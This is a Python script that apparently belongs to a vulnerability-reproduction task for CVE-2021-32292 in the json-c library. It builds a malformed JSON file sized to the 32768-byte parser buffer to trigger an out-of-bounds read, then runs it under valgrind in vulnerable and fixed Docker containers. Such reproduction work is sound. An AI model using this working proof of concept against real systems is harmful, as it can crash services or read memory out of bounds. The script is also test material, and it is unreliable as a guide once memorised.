import subprocess
import os
import sys

def generate_poc():
    print("[*] Generating PoC (Invalid JSON + Boundary Condition)...")
    # THE KEY: The JSON must be INVALID (no closing quote/brace) and exactly fill the buffer.
    # Buffer is 32768. 
    # Prefix = '{"key":"' (8 chars).
    # To avoid "json_tokener_continue" (which exits cleanly), we need a PARSE ERROR.
    # We place an invalid control char (e.g. \x01) at the very end (byte 32768).
    prefix = '{"key":"'
    # Fill up to 32767 bytes
    padding = "A" * (32768 - len(prefix) - 1)
    # Last byte is invalid char to force error at boundary
    suffix = "\x01" 
    payload = prefix + padding + suffix
    with open("manual_seed.json", "w") as f:
        f.write(payload)
    print(f"    Created manual_seed.json ({len(payload)} bytes - INVALID JSON)")

def run_target(service_name):
    print(f"\n[*] Testing {service_name}...")
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm", 
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name,
        "valgrind", "--leak-check=no", "--error-exitcode=99",
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    code = result.returncode
    
    # Mostrar salida para debugging
    if result.stdout:
        print(f"    STDOUT: {result.stdout[:500]}")
    if result.stderr:
        print(f"    STDERR: {result.stderr[:500]}")
    
    icon = "❓"
    if code == 99:
        icon = "💥 VALGRIND ERROR (OOB Read detected)"
    elif code == 139:
        icon = "💥 SEGFAULT"
    elif code == 0:
        icon = "✅ OK"
    elif code == 1:
        icon = "🛡️ HANDLED"
    
    print(f"    Exit Code: {code}  {icon}")
    return code

def main():
    generate_poc()
    
    print("\n--- STARTING VALIDATION ---")
    
    c_vuln = run_target("target-vuln")
    c_fixed = run_target("target-fixed")
    
    print("\n--- RESULTS ---")
    success = False
    
    # Vulnerable: debería crashear (139) o Valgrind error (99)
    # Fixed: debería salir limpiamente (0 o 1)
    if (c_vuln in [139, 99]) and c_fixed not in [139, 99]:
        print("✅ SUCCESS! Vulnerable crashed/errored, Fixed handled it cleanly.")
        success = True
    elif c_vuln not in [139, 99]:
        print("❌ FAIL: Vulnerable version did NOT crash/error.")
    elif c_fixed in [139, 99]:
        print("❌ FAIL: Fixed version also crashed/errored.")
        
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
